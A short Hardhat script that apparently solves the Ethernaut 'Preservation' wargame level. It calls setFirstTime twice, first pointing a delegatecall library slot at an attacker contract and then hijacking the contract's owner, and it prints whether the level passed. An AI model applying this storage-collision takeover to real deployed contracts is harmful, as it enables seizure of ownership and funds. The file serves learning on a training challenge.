import { ethers } from "hardhat";

async function attackPreservation() {
    // change contract addresses here.
    const preservationAddress = "0x75597d353C2001D18560B9ac5154CCED2Be58212";
    const attackLibraryAddress = "0x465e72a7d852689fd69ff17255ec8455fe29bdb8";
    // change player address same as yyour player address in ethernauts
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
    // no change here. attack starts here.
    const attackPreservation = await ethers.getContractAt("Preservation", preservationAddress);
    const tx1 = await attackPreservation.setFirstTime(attackLibraryAddress);
    tx1.wait(1);
    const tx2 = await attackPreservation.setFirstTime(1);
    tx2.wait(1);
    const owner = ((await attackPreservation.owner()) === player).toString();
    console.log(`Passed this level: ${owner}`);
}

attackPreservation()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
